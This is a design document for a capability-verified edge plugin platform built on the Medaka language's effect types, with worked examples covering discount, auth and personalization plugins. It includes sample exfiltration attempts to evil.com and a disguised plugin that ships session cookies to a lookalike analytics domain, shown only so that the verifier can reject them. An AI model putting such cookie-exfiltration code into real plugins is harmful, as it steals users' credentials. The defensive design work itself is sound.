# The capability platform — runtime/product architecture

Status: **direction / architecture sketch** (no code; long-horizon, post-native —
sits downstream of Phase 146 and the WasmGC backend). This is the *product* built
on top of the language feature in [`CAPABILITY-EFFECTS.md`](./CAPABILITY-EFFECTS.md):
the runtime/platform that turns Medaka's effect-as-capability-manifest into
automated trust for untrusted edge/plugin code. Read CAPABILITY-EFFECTS.md first —
it defines the effect-tracking model this depends on.

This is the "Rails, not Ruby" artifact: the flagship that gives the wedge a reason
to exist. It is a large, separate build and explicitly *not* near-term work; this
doc exists so the architecture is on record while it's fresh.

---

## 1. The stack

```
┌─────────────────────────────────────────────────────────────┐
│  Submitted Medaka plugins (UNTRUSTED)                        │
│  — capability manifest encoded in the types (effect rows)    │
├─────────────────────────────────────────────────────────────┤
│  Medaka capability platform (TRUSTED — this is what we build)│
│  — compiles source, verifies effect bounds, provisions       │
│    least-privilege deployments, owns plugin composition      │
├─────────────────────────────────────────────────────────────┤
│  Edge provider: Fastly / Cloudflare / Fermyon / WASI host    │
│  — accepts Wasm, grants COARSE capabilities (net on/off, KV) │
│  — memory sandbox + resource metering (CPU/mem/wall)         │
└─────────────────────────────────────────────────────────────┘
```

The edge provider already gives **memory sandboxing** and **coarse, per-instance
capability control via host imports** (don't link `fetch` → the module can't make
network calls). Our platform adds the **fine-grained, function-level, statically
verified** layer on top, and uses the coarse layer as a backstop.

## 2. Trust model (TCB)

- **Untrusted:** the plugin author and their submitted source.
- **Trusted (the TCB):** (a) the Medaka compiler — it must emit Wasm whose host
  imports match the verified effect manifest; (b) the platform's verification +
  provisioning logic; (c) the edge provider's coarse sandbox, as the outer fence.
- **Two fences, defense in depth:** the effect check is the *inner* fence (fine,
  static); the edge provider's "no network binding" is the *outer* fence (coarse,
  runtime). A soundness bug in the effect checker degrades to "coarse sandbox still
  holds," not "full breach." Always provision the coarse layer to match the
  manifest so the two agree.
- **Load-bearing constraint: the platform compiles the source itself; it must NOT
  accept pre-compiled Wasm.** The manifest is only trustworthy if the trusted
  compiler derived it from source. Accepting Wasm throws away the effect types and
  drops you back to coarse Wasm-level analysis.

## 3. The pipeline

```
submit Medaka source
   │
   ▼
[compile with trusted Medaka compiler]          ── type error → reject
   │   effect rows inferred + SOUND
   ▼
[verify against policy]
   • required plugin interface present?
   • each interface fn's effect row ⊆ its declared bound?   ── exceeds → reject (precise reason)
   │
   ▼
[derive manifest]   = the verified capability set (cannot lie; compiler-derived)
   │
   ▼
[provision least-privilege deployment]
   • map granted effect labels → edge host imports
   • leave UNGRANTED labels unlinked (the backstop)
   • parameterized caps (Fetch "x.com") → inject a constrained PROXY host fn
   │
   ▼
[edge provider runs the Wasm]   ← coarse sandbox + resource metering underneath
```

## 4. Verification mechanism

The compiler computes every function's effect row by inference and **soundly
guarantees** it (a function cannot perform an effect outside its row). A caller's
row is the union of everything it transitively calls. Two consequences drive the
whole design:

1. **Bound the entry point, not every function.** If the designated entry point
   typechecks at its required signature, *everything reachable from it* is bounded —
   no call-graph inspection needed. Soundness + transitivity does the work.
2. **The automation primitive is effect-row subsumption (set containment).** Policy
   declares an upper bound; the plugin's row must be a subset:
   ```
   allowed = { Cache, Log, Fetch }
   { Cache, Log }      ⊆ allowed  → ACCEPT
   { Cache, Log, KV }  ⊄ allowed  → REJECT ("uses KV, not permitted")
   ```
   Over a finite, declared label set this is a trivial, total check done as a
   byproduct of compilation.

### Three levels of guarantee (choose per plugin category)

- **Level 1 — capability bound.** "Can't fetch at all" / "only `{Cache, Log}`."
  Just the entry-point subsumption check. ~80% of real policies. (Example A.)
- **Level 2 — capability segregation by construction.** "Reads credentials AND
  fetches, but credentials can't reach an arbitrary network endpoint." Achieved by
  a **structured plugin interface**: the capability-disjoint pieces are *separate
  required functions with separate bounds*, and the **platform's trusted harness
  owns the composition** — the plugin never writes the merged handler. The
  information-flow property emerges from the interface shape (what data is allowed
  to cross between the pieces), not from analyzing a merged function. (Example B.)
- **Level 3 — full information-flow / taint typing** (track per-value provenance,
  à la Jif/FlowCaml). Heavy, ergonomically taxing, **not planned** — Level 2 buys
  the same practical guarantee via architecture for far less.

## 5. The plugin SDK model (the central architectural idea)

The platform defines, per plugin category, a **structured interface**: the exact
functions a plugin must provide, each with a declared effect bound, plus the
boundary data types that may cross between capability-disjoint pieces. The
platform's *trusted harness* calls those functions and wires them together. The
plugin author fills in bounded pieces; they never control the composition or widen
the boundary types. This is what makes Level-2 guarantees automatic: verification
reduces to independent per-function subsumption checks, and the harness (not the
plugin) decides what data flows where.

**Boundary types are the declassification points.** Because the platform owns the
types that cross between, say, the request-reading piece and the network piece, it
controls exactly what information is *allowed* to cross. Designing those types
narrowly is how you get the security property.

## 6. Worked example A — Shopify-Functions-style discount calculator (Level 1)

A discount function computes a price reduction from cart contents. It needs **no IO
at all** — pure computation. The risk: a malicious one exfiltrates cart contents
(customer PII, purchase history) to an external server.

**Platform interface:**
```
-- The ONLY function the platform calls. Required signature, pure bound:
calculate : Cart -> <> Discount        -- <> = no effects whatsoever
```

**Verification:** compile the submission; check `calculate`'s inferred row ⊆ `{}`.
That single check bounds the entire reachable program to *pure*.

**Malicious submissions and the exact trip-point:**
| Attempt | Effect row becomes | Check | Result |
|---|---|---|---|
| POST cart to `evil.com` | `{ Fetch }` | `{Fetch} ⊄ {}` | **reject** ("calculate must be pure; uses Fetch") |
| Read an env var / secret | `{ Env }` | `{Env} ⊄ {}` | **reject** |
| Log cart to a capturable sink | `{ Log }` | `{Log} ⊄ {}` | **reject** |
| Stash data in KV for later exfil | `{ KV }` | `{KV} ⊄ {}` | **reject** |

There is no way to phrase "send the cart somewhere" that doesn't introduce an
effect outside `{}`, and the bound is verified by the compiler, not by review. A
pure discount calculator is *provably* a pure discount calculator.

## 7. Worked example B — edge auth middleware (Level 2, segregation)

Auth middleware sees every request's credentials (session cookie / bearer token).
The catastrophe: a compromised auth plugin exfiltrates every user's token. It
legitimately needs to (a) read the request, and (b) talk to an identity provider —
so a flat capability bound can't help (it needs both `ReadReq` and `Fetch`). This
is the segregation case.

**Platform interface (three bounded pieces + the harness owns composition):**
```
-- 1. Pull the credential out of the request. Reads request; NO network.
extractToken : Request -> <ReadReq> Option Token

-- 2. Verify the token against the IdP. Network to the IdP ONLY; CANNOT read the
--    request (so it cannot scoop up other cookies/headers and ship them).
verify : Token -> <Fetch "idp.example.com"> AuthResult

-- 3. Turn the result into an allow/deny decision. Pure.
decide : AuthResult -> Decision
```

**The platform's trusted harness (NOT written by the plugin author):**
```
runAuth req =
  match extractToken req
    None      => Deny
    Some tok  =>
      let result = verify tok      -- only `tok` crosses to the network side
      decide result
```

**What the types prove, automatically:**
- `verify : Token -> <Fetch "idp.example.com"> AuthResult` has **no `ReadReq`**, so
  it physically cannot read cookies/headers other than the `Token` it's handed — it
  can't harvest *other* credentials or PII to exfiltrate.
- Its `Fetch` is pinned to `idp.example.com`, so even the data it *does* hold can't
  go to `evil.com`.
- `extractToken` can read the request but has **no `Fetch`** — it can't exfiltrate.
- `decide` is pure.
- The only value crossing from the request-reading side to the network side is
  `Token` (a platform-owned boundary type) — the harness, not the plugin, decides
  that.

**Malicious submissions and the exact trip-point:**
| Attempt | Trips on | Result |
|---|---|---|
| Add `fetch "evil.com"` inside `verify` | `{Fetch evil} ⊄ {Fetch idp}` (parameterized bound) | **reject** |
| Read cookies inside `verify` | needs `ReadReq`; `{ReadReq, Fetch idp} ⊄ {Fetch idp}` | **reject** |
| Exfiltrate from `extractToken` | needs `Fetch`; `{ReadReq, Fetch} ⊄ {ReadReq}` | **reject** |
| Widen `verify` to take the whole `Request` | signature ≠ required interface (`verify : Token -> …`) | **reject** (interface mismatch) |
| Stash the token in KV from `extractToken` | needs `KV`; `⊄ {ReadReq}` | **reject** |

The last row is the subtle one: the plugin can't "just pass the whole request to
the network side," because the platform's harness controls the call (`verify tok`)
and the required signature only gives `verify` a `Token`. **The interface contract
is what forecloses the data-smuggling path** — the thing manual review would
otherwise have to catch.

## 7a. Effect labels → host capabilities; parameterized capabilities → proxies

- Each effect label maps to a host import the edge provider supplies. Granting a
  label = linking its host fn; denying = leaving it unlinked.
- The provider's imports are **coarse** ("network on"). A parameterized capability
  like `<Fetch "idp.example.com">` (single allowed domain) can't be enforced by a
  coarse "network on" import. The platform **injects a constrained proxy host
  function** that permits only that domain — adding enforcement the provider lacks.
  This is exactly the platform's value-add over a thin wrapper.

## 7b. Worked example C — multi-plugin personalization pipeline (composition, scoped state, per-install policy)

Scenario: an e-commerce host lets a store owner install several third-party "edge
personalization" plugins that run in a pipeline on each page request. Store #42
installs three, from three different untrusted vendors:
- `geoLocalize` — picks a locale from request geo. Needs `<GeoIP>`; no network, no
  storage.
- `abTest` — assigns/persists an experiment bucket. Needs `<KV "ab:store42:abtest">`
  (its own namespace); no network, no raw request.
- `recoWidget` — fetches recommendations from the vendor API and injects a widget.
  Needs `<Fetch "api.recovendor.com">`; no storage, no geo.

New concepts beyond A/B: **(1)** composing *mutually-untrusting* plugins on one
path, **(2)** scoped *stateful* capabilities, **(3)** per-install policy as lattice
narrowing, **(4)** the memory-vs-capability isolation distinction.

**Pipeline interface — each plugin is one stage; the platform owns the thread:**
```
-- Context is a PLATFORM-OWNED boundary type; plugins touch it only via typed
-- accessors the platform exposes — it is the SOLE cross-plugin channel.
geoLocalize : Context -> <GeoIP> Context
abTest      : Context -> <KV "ab:store42:abtest"> Context
recoWidget  : Context -> <Fetch "api.recovendor.com"> Context
```
```
-- trusted harness (NOT plugin-authored):
runPipeline req =
  let c0 = mkContext req     -- platform builds the initial Context; controls what's exposed
  render (recoWidget (abTest (geoLocalize c0)))
```

**(1) Inter-plugin isolation — two complementary mechanisms.**
- *Capability isolation (effects):* each stage's row is verified independently.
  `recoWidget` has `Fetch` but no `KV`/`GeoIP`; `abTest` has scoped `KV` but no
  `Fetch`. A compromised `recoWidget` provably cannot read the A/B store; `abTest`
  provably cannot phone home.
- *Memory isolation (Wasm boundary):* capability isolation is **not** memory
  isolation — Wasm isolates an *instance* from the host, not sub-parts of one
  module from each other. So mutually-untrusting plugins must be **separate Wasm
  components/instances** (memory-isolated by the Wasm boundary), with the harness
  threading `Context` *across* the component boundary — exactly what the component
  model is for. Effects give capability isolation + the manifest; the component
  boundary gives memory isolation.
- *The `Context` is the only channel.* A plugin sees only the typed `Context` fields
  the platform exposes (`locale`, `bucket`) — never another plugin's internals,
  never the raw request unless the platform chose to expose it. Cross-tenant
  declassification is a platform decision, not a plugin one.

**(2) Scoped stateful capabilities.** `<KV>` is too coarse — it would let `abTest`
read the store's order data or another plugin's keys. The capability is
**parameterized with a namespace**: `<KV "ab:store42:abtest">`. The platform injects
a KV proxy that confines every key to that prefix, so `abTest` physically cannot
address keys outside it. (Same proxy pattern as the pinned `Fetch` domain in §7a —
parameterization carrying a *resource scope* rather than a network destination.)

**(3) Per-install policy as lattice intersection.** The platform sets a **category
ceiling** per plugin type; the store owner's **install policy** can only *tighten*;
the effective bound is the intersection, and the plugin's verified row must be ⊆ it:
```
recoWidget category ceiling : { Fetch recovendor-domains }
store42 install policy       : { }   (privacy-conscious: "no plugin may use the network")
effective bound = ceiling ∩ policy : { }
recoWidget verified row      : { Fetch "api.recovendor.com" }  ⊄ { }
   → recoWidget REJECTED FOR THIS INSTALL ("requires Fetch, denied by your policy")
```
The same plugin binary installs fine for a permissive store and is refused for
store42 — decided by set intersection + subsumption, no re-review. The customer is
a first-class policy actor.

**(4) Subdividing a coarse grant among co-resident tenants — the payoff.** The
combined deployment's *coarse* provisioning is the **union** of what the plugins
need (network + KV + geo); the host grants the deployment all three. Yet each plugin
is provably bounded *tighter* than the union: `recoWidget` can't touch KV, `abTest`
can't fetch. **The effect layer safely partitions one coarse grant among
mutually-untrusting tenants** — the multi-tenant form of "granularity below the
import" that no host-import model provides. With one component per plugin, each is
also only *linked* the imports its manifest declares, so the partition holds at the
Wasm boundary too, not just in the types.

**Malicious trip-points:**
| Attempt | Trips on |
|---|---|
| `recoWidget` reads A/B KV to profile users | needs `KV`; `⊄ {Fetch recovendor}` |
| `abTest` POSTs bucket+PII to a tracker | needs `Fetch`; `⊄ {KV ab:…}` |
| `abTest` reads key `orders:store42:*` | KV proxy confines to `ab:store42:abtest:*` → denied at the namespace boundary |
| `recoWidget` reads another plugin's `Context` internals | only typed fields exposed; no accessor exists |
| any plugin uses the network under store42's policy | `⊄ {}` effective bound → rejected at install |

## 7c. The minimal "wow" demo (the first shareable artifact)

The thinnest end-to-end slice that lands the punch — and the concrete target that
near-term PLAN items (fine-grained labels + a thin harness) aim at. Guiding
principle: **truthful** (the guarantee is real) but **minimal** (stub everything
that isn't the story). **The story is compile-time capability verification, which is
decoupled from the backend** — it's true and compelling on the *existing tree-walker*,
well ahead of the native backend (which, at the current cadence, is itself months —
not years — away). That decoupling is the point: the
"make-people-care" milestone is reachable cheaply.

**One line:** *Submit an AI-generated edge plugin that tries to exfiltrate user
data. A JS platform would deploy it. Medaka's compiler rejects it automatically — no
human reviewed it — because it proved the plugin reaches the network, even though the
call is buried several helpers deep.*

**The ~90-second script:**
1. "Contract for an edge transform plugin: may use `<Cache, Log>`, nothing else."
2. Submit a **good** plugin → `✅ accepted` → it *runs* (interpreter) and rewrites a
   header. Safe code works.
3. Submit a **malicious** plugin that looks like normal analytics → `❌ rejected`:
   ```
   transform requires <Fetch> — not permitted by policy {Cache, Log}
     reached via: transform → tagVisit → recordMetric → sendBeacon → fetch
   ```
4. Punchline: no human looked at it; the exfiltration was four calls deep, past where
   review and `grep` give up; the type system found it.

**The malicious plugin — exfiltration buried deep (what makes it credible):**
```
sendBeacon (url, body) = fetch url body                       -- uses <Fetch>
recordMetric ev        = sendBeacon ("https://analytics-cdn.io/c", ev)
tagVisit req           = recordMetric (sessionCookie req)     -- ships the cookie
transform req =
  let _ = tagVisit req            -- the poison: pulls <Fetch> up the call graph
  cacheAndReturn (rewrite req)
```
Effect **propagation** carries `<Fetch>` up `fetch → sendBeacon → recordMetric →
tagVisit → transform`; inferred row `{Fetch, Cache, Log} ⊄ {Cache, Log}` → reject,
**with the chain printed.** The "via" chain is the money shot — it shows this is a
*proof through the call graph*, not `grep fetch`, and is a live demonstration of why
soundness (already shipped) matters.

**The harness (~150–250 lines, the "automated reviewer"):** submitted file → compile
+ typecheck → read `transform`'s inferred effect row → check `⊆ policy` → accept (and
run) or reject with reason + chain. That is the entire demo "platform."

**What it needs to build:**
| Piece | Status |
|---|---|
| Effect soundness/propagation (makes the rejection trustworthy) | ✅ done (Phase 79/146) |
| User-definable fine-grained labels (`effect Fetch/Cache/Log`) | ✅ done (Phase 146 gap-2) |
| The harness (`medaka check-policy`) | ✅ done — `demo/` + `bin/main.ml` |
| LLVM / WasmGC / real edge host / parameterized effects / full platform | ❌ not needed |

The demo is **complete and runnable** (`demo/plugin_good.mdk`, `demo/plugin_malicious.mdk`,
`medaka check-policy --policy Cache,Log <plugin.mdk>`).

So the demo ≈ **the next roadmap item (gap-2 labels) + a thin harness, on the
existing interpreter.**

**Credibility checklist (don't skip):**
- Malicious code must be **plausible** (buried, lookalike domain, reads like real
  telemetry) — if it's obviously evil, skeptics say "review would catch that."
- Bury `fetch` **several calls deep** — proves proof-through-call-graph, not
  pattern-matching.
- **Show the good plugin run** — "safe works, unsafe blocked," both halves.
- Keep plugin code **clean/readable** — the anti-ivory-tower identity.
- **Scope the claim honestly** — at demo stage the plugin runs on the tree-walker
  (not memory-sandboxed, not fast). The demo proves *automated capability
  verification* (the differentiated part); native/Wasm sandbox + perf is the
  production build-out. Say so — a technical audience will ask.

**Format:** a writeup/blog post (the thing that travels — Show HN / Lobsters / Wasm +
PL crowds) + a ~90s asciinema + a runnable repo. A web playground (removes the
install barrier) is the highest-leverage *next* step; defer past v1.

**Stretch upgrades (after the base lands), by visceral punch:** (1) generate the
malicious plugin with an actual LLM in the demo (AI-guardrail thesis, ~zero extra
build); (2) parameterized pinned domain (Phase 146b) — "allowed IdP passes,
`evil.com` rejected"; (3) the segregation example (§7) — "reads cookies AND fetches,
provably can't send cookies to the network."

## 8. Honest boundaries / non-goals

- **Capability effects cover *authority*, not *resources*.** A pure function can
  still infinite-loop or allocate forever; timing side channels and CPU/mem
  exhaustion are **out of scope** — rely on the edge provider's resource metering
  and the Wasm memory sandbox. Capability effects are the *what-can-it-touch* layer,
  not a complete security story.
- **Covert channels remain.** Even segregated code can leak via timing (e.g. the
  pattern of IdP calls). The guarantee is "no *direct authority* to exfiltrate,"
  not "zero information leakage."
- **No FFI/`unsafe` escape hatch in submitted code.** Any escape punches through
  the guarantee. Submissions must forbid it (or its presence counts as
  max-capability). This constrains what language features are allowed in plugins.
- **Soundness is now a security property.** Any hole in effect inference is a
  security hole — raising the correctness bar on Phase 146 and reinforcing the
  differential-testing discipline. The coarse sandbox backstop limits the blast
  radius of a soundness bug but is not an excuse for one.
- **This is a large, separate, long-horizon build** — downstream of a working
  WasmGC backend and Phase 146. Not near-term. Documented now only to preserve the
  architecture.

## 9. Open questions

- Which edge provider to target first (Fastly / Cloudflare / Fermyon / raw WASI)?
- Integration with the **Wasm component model / WASI Preview 2** capability story —
  reuse vs. layer on top; don't reinvent what the component model already expresses.
- **Per-install policy:** a customer installing a plugin may want to narrow its
  allowed set further than the category default — how is that expressed and checked?
- **Multi-plugin composition** on one request path: combined manifests, ordering,
  isolation between plugins (see Example C §7b).
- **Component granularity vs. cold-start cost:** one Wasm component per plugin gives
  memory isolation (Example C) but more instances + more cold starts per request;
  one shared module is cheaper but only gives *capability* isolation, not memory
  isolation. The right default per plugin category is open.
- **Boundary-type design discipline:** guidance/tooling so SDK authors design
  declassification types (`Token`, `Decision`) narrowly.
- Billing/quotas/observability for a multi-tenant plugin host.
- Whether the harness/SDK is itself written in Medaka (dogfood) and how its trusted
  status is established.

## 10. Sequencing

Strictly downstream: **Phase 146 (capability-safe effects)** → **WasmGC backend**
(Stage 2, sibling to LLVM via the Core IR seam) → **this platform**. The language
feature and the backend are prerequisites; this doc is the target they aim at, not
work to start now. The cheap early validation is the *design* (worked plugin
interfaces like §6–§7), pressure-tested on paper against real plugin categories
before any runtime exists.
